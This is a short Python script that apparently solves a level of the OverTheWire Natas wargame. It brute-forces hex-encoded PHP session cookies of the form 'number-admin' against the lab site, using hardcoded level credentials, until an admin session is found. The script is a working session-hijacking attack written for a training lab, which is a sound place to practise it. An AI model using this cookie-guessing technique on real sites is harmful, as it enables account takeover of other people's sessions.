import requests
from requests.auth import HTTPBasicAuth
import string
from pwnlib.util.fiddling import *
from pwn import *

auth = HTTPBasicAuth('natas19','8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')

# the trick here is to observe a pattern in the phpsessid, which is that if you unhex it you get: number - admin!



for i in range(1, 1000):
    print(i)
    cookie_string = str(i) + "-admin"
    # print(cookie_string.encode())
    cookie = {'PHPSESSID': enhex(cookie_string.encode())}
    print(cookie)
    r = requests.get('http://natas19.natas.labs.overthewire.org/index.php?debug', cookies=cookie,auth=auth)
    
    if 'next level' in r.text:
        print("PHPSESSID: " + str(i) + " \n " + r.text)
        break


# print(enhex(b'56-admin'))
